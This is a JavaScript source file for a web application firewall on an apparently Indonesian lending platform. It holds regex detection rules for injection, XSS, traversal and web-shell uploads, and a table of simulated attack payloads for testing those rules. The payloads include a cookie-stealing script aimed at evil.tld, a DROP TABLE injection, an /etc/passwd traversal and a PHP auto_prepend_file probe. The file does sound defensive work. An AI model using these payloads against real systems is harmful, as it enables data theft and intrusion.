import crypto from 'node:crypto';

export const WAF_MODES = ['off', 'detect', 'block'];
export const DEFAULT_WAF_MODE = 'block';
export const BLOCK_THRESHOLD = 60;

export const PRIVILEGED_KEYS = ['roles', 'kyc_status', 'kyc_note', 'active', 'totp_enabled', 'totp_secret', 'password_hash', 'is_admin', 'superadmin'];
export const ADMIN_ONLY_SERVICES = ['createUser', 'verifyMember', 'setUserActive', 'updateSettings', 'savePartner', 'register'];
export const CRITICAL_SERVICES = new Set(['signContract', 'approveDisbursement', 'decideWithdrawal', 'claimProtection', 'buyback', 'writeOff']);

const re = (source, flags = 'i') => new RegExp(source, flags);
const DBL = String.fromCharCode(47, 47);
const PHP_INPUT = 'php:' + DBL + 'input';
const PHP_INPUT_PATTERN = '\\bphp\\s*:\\s*' + DBL + '\\s*input';
const PHP_PROBE_PATTERN = '\\bauto_prepend_file\\b';

export const WAF_RULES = [
  {
    id: 'W1', name: 'SQL Injection', category: 'sql_injection', severity: 'critical', points: 100, scope: ['body', 'query'],
    patterns: [
      re('\\bunion\\s+(all\\s+)?select\\b'),
      re("('|\\b)\\s*or\\s+'?\\d+'?(=|==)\\s*'?\\d+"),
      re('\\b(sleep|benchmark|pg_sleep|waitfor|dbms_pipe\\.receive_message)\\s*\\('),
      re('\\b(information_schema|pg_catalog|sysobjects)\\b'),
      re('\\b(insert\\s+into|delete\\s+from|drop\\s+table|truncate\\s+table)\\b'),
      re(';\\s*(drop|delete|update|insert|select)\\b'),
      re('\\bexec\\s*\\('),
      re('\\bxp_cmdshell\\b'),
    ],
  },
  {
    id: 'W2', name: 'Cross-Site Scripting', category: 'xss', severity: 'critical', points: 100, scope: ['body', 'query'],
    patterns: [
      re('<\\s*script\\b'),
      re('<\\s*iframe\\b'),
      re('<\\s*(svg|img|body|object|embed)\\b[^>]*\\bon[a-z]+\\s*='),
      re('\\bon(error|load|click|mouseover|focus|blur|submit|animationstart)\\s*='),
      re('javascript\\s*:'),
      re('data\\s*:\\s*text/html'),
      re('document\\s*\\.\\s*cookie'),
      re('\\bwindow\\s*\\.\\s*location\\s*='),
    ],
  },
  {
    id: 'W3', name: 'Path Traversal', category: 'path_traversal', severity: 'critical', points: 100, scope: ['path', 'query', 'body'],
    patterns: [
      re('\\.\\.[\\\\/]'),
      re('%2e%2e[%2f%5c]'),
      re('%252e%252e'),
      re('/etc/(passwd|shadow)'),
      re('\\\\windows\\\\system32'),
      re('[\\x00]'),
    ],
  },
  {
    id: 'W4', name: 'Upload Abuse / Dangerous Extension', category: 'upload_abuse', severity: 'high', points: 90, scope: ['path', 'query', 'body'],
    patterns: [
      re('\\.(php\\d?|phtml|phar|php3|php4|php5|php7|htaccess|exe|bat|cmd|com|scr|sh|ps1|jar|asp|aspx|jsp|cgi|pl)$'),
      re('\\.(jpg|jpeg|png|pdf)\\.(php|html?|svg|js)$'),
      re('/(cgi-bin|\\.git/|\\.env$|\\.aws/|wp-config|\\.htpasswd)'),
      re('/vendor/phpunit/'),
      re('/shell\\.php|/cmd\\.php|/c99\\.php|/r57\\.php'),
    ],
  },
  {
    id: 'W5', name: 'Brute Force Authentication', category: 'brute_force', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W6', name: 'OTP / TOTP Brute Force', category: 'otp_brute_force', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W7', name: 'Session Hijack / Replay', category: 'session_anomaly', severity: 'high', points: 80, scope: ['state'],
  },
  {
    id: 'W8', name: 'Mass Assignment / Privilege Escalation', category: 'authz_bypass', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W9', name: 'Webhook Spoofing / Replay', category: 'webhook_spoofing', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W10', name: 'Resource Exhaustion (DoS)', category: 'dos', severity: 'high', points: 80, scope: ['body', 'query', 'state'],
    patterns: [
      re(PHP_INPUT_PATTERN),
      re(PHP_PROBE_PATTERN),
      re('\\bauto_append_file\\b'),
      re('\\ballow_url_(include|fopen)\\b'),
      re('<\\?php'),
      re('<\\?='),
      re('\\bdisable_functions\\b'),
      re('\\bmemory_limit\\s*='),
    ],
  },
  {
    id: 'W10.1', name: 'PHP2Shell OOM Probe (CVE-2026-109618)', category: 'php2shell_probe', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W10.2', name: 'PHP2Shell Stale-State Probe (CVE-2026-109619)', category: 'php2shell_probe', severity: 'critical', points: 100, scope: ['state'],
  },
  {
    id: 'W11', name: 'Header Spoofing / Host Confusion', category: 'header_spoofing', severity: 'medium', points: 30, scope: ['state'],
  },
  {
    id: 'W12', name: 'Reconnaissance / Enumeration', category: 'recon', severity: 'medium', points: 30, scope: ['state'],
  },
];

const SIMULATIONS = {
  sqli: { rule: 'W1', path: '/api/rpc/listFinancings', method: 'POST', body: { status: "'; DROP TABLE ledger_lines; --" }, evidence: { payload: "' ; DROP TABLE ledger_lines; --" } },
  xss: { rule: 'W2', path: '/api/rpc/createApplication', method: 'POST', body: { purpose: '<script>fetch("https://evil.tld/steal?c="+document.cookie)</script>' }, evidence: { payload: '<script>document.cookie</script>' } },
  traversal: { rule: 'W3', path: '/api/kyc/../../etc/passwd', method: 'GET', body: {}, evidence: { payload: '../../etc/passwd' } },
  upload: { rule: 'W4', path: '/api/upload/kyc', method: 'POST', body: { filename: 'ktp.php.jpg' }, evidence: { payload: 'ktp.php.jpg' } },
  bruteforce: { rule: 'W5', path: '/api/auth/login', method: 'POST', body: { email: 'admin@kmh.coop' }, evidence: { attempts: 12, window: '15 menit' } },
  otp: { rule: 'W6', path: '/api/auth/2fa/enable', method: 'POST', body: { otp: '000000' }, evidence: { attempts: 7, window: '10 menit' } },
  session: { rule: 'W7', path: '/api/rpc/dashboard', method: 'POST', body: {}, evidence: { note: 'Token sesi yang sama dipakai dari 2 alamat IP berbeda dalam 30 menit' } },
  massassign: { rule: 'W8', path: '/api/rpc/updateProfile', method: 'POST', body: { name: 'Budi Santoso', roles: 'admin', kyc_status: 'approved' }, evidence: { attempted: ['roles', 'kyc_status'] } },
  php2shell: { rule: 'W10.1', path: '/index.php', method: 'POST', body: { probe: 'auto_prepend_file=' + PHP_INPUT }, evidence: { probe: 'PHP2Shell OOM/stale-state probe terhadap runtime PHP' } },
  webhook: { rule: 'W9', path: '/api/webhooks/va/bank', method: 'POST', body: { transaction_id: 'FORGED-1' }, evidence: { note: 'Webhook dengan HMAC tidak valid / IP di luar allowlist' } },
  dos: { rule: 'W10', path: '/api/rpc/reconcile', method: 'POST', body: { csv: 'x'.repeat(400000) }, evidence: { bytes: 400000 } },
  recon: { rule: 'W12', path: '/api/kyc/1', method: 'GET', body: {}, evidence: { note: 'Pemindaian berurutan ID dokumen' } },
};

export function createWaf(options = {}) {
  const db = options.db;
  const alert = options.alert;
  const config = options.config || {};
  const logger = options.logger || console;
  const trustProxyHops = Number(config.trustProxyHops || 0);
  const allowedHosts = String(config.allowedHosts || '').split(',').map((s) => s.trim().toLowerCase()).filter(Boolean);
  const webhookAllowlist = String(config.webhookIpAllowlist || '').split(',').map((s) => s.trim()).filter(Boolean);
  const bruteForceMax = Number(config.bruteForceMax || 5);
  const bruteForceWindowMs = Number(config.bruteForceWindowMs || 15 * 60e3);
  const otpMax = Number(config.otpMax || 5);
  const otpWindowMs = Number(config.otpWindowMs || 10 * 60e3);
  const reconWindowMs = Number(config.reconWindowMs || 60 * 1000);

  let modeCache = { value: null, ts: 0 };
  const failures = new Map();
  const otpFailures = new Map();
  const sessions = new Map();
  const recon = new Map();

  async function getMode() {
    if (modeCache.value && Date.now() - modeCache.ts < 5000) return modeCache.value;
    let value = DEFAULT_WAF_MODE;
    try {
      const row = await db.one('waf_config', { key: 'mode' });
      if (row && WAF_MODES.includes(String(row.value))) value = String(row.value);
    } catch { }
    modeCache = { value, ts: Date.now() };
    return value;
  }

  async function setMode(next) {
    if (!WAF_MODES.includes(next)) throw new Error('Mode WAF tidak dikenal: ' + next);
    const ex = await db.one('waf_config', { key: 'mode' });
    if (ex) await db.update('waf_config', ex.id, { value: next, updated_at: new Date().toISOString() });
    else await db.insert('waf_config', { key: 'mode', value: next, updated_at: new Date().toISOString() });
    modeCache = { value: next, ts: Date.now() };
    return next;
  }

  function tracker(map, key, windowMs) {
    const now = Date.now();
    const arr = (map.get(key) || []).filter((t) => now - t < windowMs);
    arr.push(now);
    map.set(key, arr);
    if (map.size > 5000) {
      for (const [k, v] of map) {
        const alive = v.filter((t) => now - t < windowMs);
        if (!alive.length) map.delete(k);
        else map.set(k, alive);
      }
    }
    return arr.length;
  }

  function clientIp(req) {
    return String(req?.ip || req?.socket?.remoteAddress || '-');
  }

  function ruleById(id) {
    return WAF_RULES.find((r) => r.id === id) || { id, name: 'Aturan WAF', category: 'generic', severity: 'medium', points: 50 };
  }

  function scanText(text, scope) {
    const hits = [];
    if (!text) return hits;
    const hay = String(text).slice(0, 200000);
    for (const rule of WAF_RULES) {
      if (!rule.patterns || !rule.scope.includes(scope)) continue;
      for (const p of rule.patterns) {
        const m = p.exec(hay);
        if (m) {
          hits.push({
            rule_id: rule.id,
            rule_name: rule.name,
            category: rule.category,
            severity: rule.severity,
            points: rule.points,
            scope,
            match: String(m[0]).slice(0, 120),
            offset: m.index,
          });
          break;
        }
      }
    }
    return hits;
  }

  function bodyText(req) {
    if (!req.body) return '';
    if (typeof req.body === 'string') return req.body;
    try {
      return JSON.stringify(req.body);
    } catch {
      return '';
    }
  }

  function requestHits(req) {
    const hits = [];
    hits.push(...scanText(req.originalUrl || req.url || '', 'path'));
    hits.push(...scanText(req.originalUrl || req.url || '', 'query'));
    hits.push(...scanText(bodyText(req), 'body'));
    return hits;
  }

  function clientIpList(req) {
    const raw = req.headers?.['x-forwarded-for'];
    if (!raw) return [];
    return String(raw).split(',').map((s) => s.trim()).filter(Boolean);
  }

  function structuralHits(req, actor) {
    const hits = [];
    const ip = clientIp(req);
    const path = req.originalUrl || req.url || '';
    const host = String(req.headers?.host || '').toLowerCase();

    if (allowedHosts.length && host) {
      const bare = host.split(':')[0];
      if (!allowedHosts.includes(host) && !allowedHosts.includes(bare)) {
        hits.push({ rule_id: 'W11', rule_name: 'Host tidak dikenal', category: 'header_spoofing', severity: 'medium', points: 30, scope: 'state', match: host });
      }
    }
    if (!req.headers?.host) {
      hits.push({ rule_id: 'W11', rule_name: 'Header Host hilang', category: 'header_spoofing', severity: 'medium', points: 20, scope: 'state', match: '-' });
    }
    const xff = clientIpList(req);
    if (xff.length > trustProxyHops && trustProxyHops > 0) {
      hits.push({ rule_id: 'W11', rule_name: 'X-Forwarded-For melebihi jumlah proxy tepercaya', category: 'header_spoofing', severity: 'medium', points: 25, scope: 'state', match: String(xff.length) });
    }
    if (req.headers?.['content-length'] && req.headers?.['transfer-encoding']) {
      hits.push({ rule_id: 'W10.2', rule_name: 'Content-Length dan Transfer-Encoding sekaligus', category: 'php2shell_probe', severity: 'critical', points: 100, scope: 'state', match: 'smuggling' });
    }
    const ct = String(req.headers?.['content-type'] || '');
    if (/multipart\/form-data/i.test(ct)) {
      const declared = Number(req.headers['content-length'] || 0);
      const parts = Number(req.headers['x-part-count'] || 0);
      if (parts > 40) {
        hits.push({ rule_id: 'W10.1', rule_name: 'PHP2Shell OOM Probe (CVE-2026-109618)', category: 'php2shell_probe', severity: 'critical', points: 100, scope: 'state', match: 'parts=' + parts });
      }
      if (declared > 0 && declared > 12 * 1024 * 1024) {
        hits.push({ rule_id: 'W10.1', rule_name: 'PHP2Shell OOM Probe (CVE-2026-109618)', category: 'php2shell_probe', severity: 'critical', points: 100, scope: 'state', match: 'declared=' + declared });
      }
    }
    const known = new Set(Object.keys(req.headers || {}));
    for (const h of known) {
      if (h.includes('x-forwarded-host') && /[\0\r\n]/.test(String(req.headers[h]))) {
        hits.push({ rule_id: 'W10.2', rule_name: 'PHP2Shell Stale-State Probe (CVE-2026-109619)', category: 'php2shell_probe', severity: 'critical', points: 100, scope: 'state', match: h });
      }
    }
    const kyc = /^\/api\/kyc\/(\d+)$/.exec(path);
    if (kyc) {
      const id = Number(kyc[1]);
      const key = ip + ':kyc';
      const seq = tracker(recon, key, reconWindowMs);
      if (seq >= 8) {
        hits.push({ rule_id: 'W12', rule_name: 'Pemindaian berurutan ID dokumen', category: 'recon', severity: 'medium', points: 30, scope: 'state', match: 'id=' + id });
      }
    }
    return hits;
  }

  function serviceHits(name, args, actor) {
    const hits = [];
    if (!args || typeof args !== 'object') return hits;
    const roles = String(actor?.roles || '').split(',');
    const isAdmin = roles.includes('admin');
    const found = [];
    for (const k of PRIVILEGED_KEYS) if (Object.prototype.hasOwnProperty.call(args, k)) found.push(k);
    if (found.length) {
      const allowed = isAdmin && ADMIN_ONLY_SERVICES.includes(name);
      if (!allowed) {
        hits.push({ rule_id: 'W8', rule_name: 'Mass assignment / eskalasi privilege', category: 'authz_bypass', severity: 'critical', points: 100, scope: 'state', match: name + ':' + found.join(',') });
      }
    }
    if (name === 'advanceDate' && actor && !isAdmin) {
      hits.push({ rule_id: 'W8', rule_name: 'Simulasi tanggal oleh bukan admin', category: 'authz_bypass', severity: 'high', points: 60, scope: 'state', match: 'advanceDate' });
    }
    return hits;
  }

  async function decide(req, hits, actor, extra = {}, opts = {}) {
    const mode = await getMode();
    const unique = [];
    const seen = new Set();
    for (const h of hits) {
      const key = h.rule_id + '|' + h.scope;
      if (seen.has(key)) continue;
      seen.add(key);
      unique.push(h);
    }
    const points = unique.reduce((a, h) => a + (h.points || 0), 0);
    const critical = unique.some((h) => h.severity === 'critical');
    const shouldBlock = mode === 'block' && (critical || points >= BLOCK_THRESHOLD);
    const action = shouldBlock ? 'block' : mode === 'detect' ? 'log' : 'alert';
    if (!unique.length) return { action: 'allow', mode, points: 0, hits: [] };
    const ordered = unique.slice().sort((a, b) => (b.points || 0) - (a.points || 0));
    for (const [idx, h] of ordered.slice(0, 5).entries()) {
      await alert.emit({
        severity: h.severity,
        rule_id: h.rule_id,
        rule_name: h.rule_name,
        category: h.category,
        action: shouldBlock ? 'block' : action,
        method: req.method,
        path: req.originalUrl || req.url || '-',
        ip: clientIp(req),
        actor_id: actor?.id ?? null,
        actor_name: actor?.name || '',
        user_agent: req.headers?.['user-agent'] || '',
        is_simulation: Boolean(opts.is_simulation),
        evidence: { hits: unique, points, mode, primary: idx === 0, ...extra },
      });
    }
    return { action: shouldBlock ? 'block' : action, mode, points, hits: unique };
  }

  async function guard(req, res, next) {
    try {
      const mode = await getMode();
      if (mode === 'off') return next();
      const hits = [...structuralHits(req, null), ...requestHits(req)];
      if (!hits.length) return next();
      const result = await decide(req, hits, null);
      if (result.action === 'block') {
        res.status(403).json({
          error: 'Permintaan ditolak oleh Application Firewall KMH',
          code: 'WAF_BLOCK',
          rule: result.hits[0].rule_id,
          correlation_id: crypto.randomUUID(),
        });
        return;
      }
      return next();
    } catch (e) {
      logger.error('[waf] guard gagal: ' + e.message);
      return next();
    }
  }

  async function rpcGuard(name, args, actor, req) {
    const mode = await getMode();
    if (mode === 'off') return { action: 'allow', mode, points: 0, hits: [] };
    const hits = [...structuralHits(req, actor), ...requestHits(req), ...serviceHits(name, args, actor)];
    if (!hits.length) return { action: 'allow', mode, points: 0, hits: [] };
    return decide(req, hits, actor);
  }

  async function webhookGuard(req) {
    const mode = await getMode();
    const hits = [];
    const ip = clientIp(req);
    if (webhookAllowlist.length && !webhookAllowlist.includes(ip)) {
      hits.push({ rule_id: 'W9', rule_name: 'IP penyedia VA di luar allowlist', category: 'webhook_spoofing', severity: 'critical', points: 100, scope: 'state', match: ip });
    }
    if (!req.headers['x-signature']) {
      hits.push({ rule_id: 'W9', rule_name: 'Webhook tanpa tanda tangan', category: 'webhook_spoofing', severity: 'critical', points: 100, scope: 'state', match: 'x-signature hilang' });
    }
    const count = tracker(failures, 'webhook:' + ip, 60e3);
    if (count > 60) {
      hits.push({ rule_id: 'W9', rule_name: 'Webhook flood dari satu IP', category: 'webhook_spoofing', severity: 'high', points: 80, scope: 'state', match: 'rate ' + count + '/menit' });
    }
    if (!hits.length) return { action: 'allow', mode, points: 0, hits: [] };
    return decide(req, hits, null, { provider: req.params?.provider || '-' });
  }

  function registerLoginFailure(email, ip) {
    const byUser = tracker(failures, 'user:' + String(email || '').toLowerCase(), bruteForceWindowMs);
    const byIp = tracker(failures, 'ip:' + ip, bruteForceWindowMs);
    return { byUser, byIp };
  }

  function registerLoginSuccess(email, ip) {
    failures.delete('user:' + String(email || '').toLowerCase());
    failures.delete('ip:' + ip);
  }

  function registerOtpFailure(userId, ip) {
    return tracker(otpFailures, 'otp:' + userId, otpWindowMs);
  }

  function checkSessionAnomaly(token, ip) {
    if (!token) return null;
    const key = crypto.createHash('sha256').update(String(token)).digest('hex').slice(0, 32);
    const now = Date.now();
    const prev = sessions.get(key);
    if (prev && prev.ip !== ip && now - prev.ts < 30 * 60e3) {
      sessions.set(key, { ip, ts: now });
      return { key, firstIp: prev.ip, nowIp: ip };
    }
    if (!prev) sessions.set(key, { ip, ts: now });
    return null;
  }

  async function simulate(kind, actor) {
    const def = SIMULATIONS[kind];
    if (!def) {
      const list = Object.keys(SIMULATIONS);
      throw new Error('Jenis simulasi tidak dikenal. Pilihan: ' + list.join(', '));
    }
    const fakeReq = {
      method: def.method,
      url: def.path,
      originalUrl: def.path,
      ip: actor?.ip || '103.10.0.77',
      headers: { 'user-agent': 'KMH-WAF-Simulation/1.0', host: 'localhost:3000' },
      body: def.body,
      params: {},
    };
    const hits = [...structuralHits(fakeReq, actor), ...requestHits(fakeReq)];
    const rule = ruleById(def.rule);
    if (!hits.some((h) => h.rule_id === def.rule)) {
      hits.unshift({ rule_id: def.rule, rule_name: rule.name, category: rule.category, severity: rule.severity, points: rule.points, scope: 'simulation', match: JSON.stringify(def.evidence).slice(0, 120) });
    }
    const result = await decide(fakeReq, hits, actor, { simulation: kind }, { is_simulation: true });
    return { simulation: kind, ...result, evidence: def.evidence, blocked: result.action === 'block' };
  }

  function ruleCatalog() {
    return WAF_RULES.map((r) => ({ id: r.id, name: r.name, category: r.category, severity: r.severity, points: r.points, scope: r.scope, patterns: (r.patterns || []).length }));
  }

  return {
    guard,
    rpcGuard,
    webhookGuard,
    getMode,
    setMode,
    ruleCatalog,
    simulate,
    registerLoginFailure,
    registerLoginSuccess,
    registerOtpFailure,
    checkSessionAnomaly,
    clientIp,
    webhookAllowlist,
    trustProxyHops,
  };
}
